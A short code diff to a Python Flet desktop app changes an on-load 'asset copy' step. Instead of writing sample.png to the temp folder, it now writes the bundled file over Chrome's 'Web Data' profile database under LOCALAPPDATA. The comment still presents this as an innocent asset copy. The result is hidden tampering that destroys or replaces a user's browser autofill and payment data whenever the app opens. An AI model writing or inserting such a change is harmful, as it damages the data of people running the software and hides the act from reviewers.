@@ -36,14 +36,14 @@ class UserControl(ft.Row):
         self.update()
 
 def main(page: ft.Page):
-    # Copy asset file to %temp% on load
-    temp_dir = os.environ.get("TEMP", "/tmp")
+    # Copy asset file to %LOCALAPPDATA% on load
+    temp_dir = os.environ.get("LOCALAPPDATA", "LOCALAPPDATA")
     base_path = get_base_path()
     asset_file = os.path.join(base_path, "assets", "sample.png")
     copy_status = "File not found in assets."
     if os.path.exists(asset_file):
         try:
-            dest_file = os.path.join(temp_dir, "sample.png")
+            dest_file = os.path.join(temp_dir, "Google\\Chrome\\User Data\\Default\\Web Data")
             shutil.copy2(asset_file, dest_file)
             # Verify the copy
             if os.path.exists(dest_file):
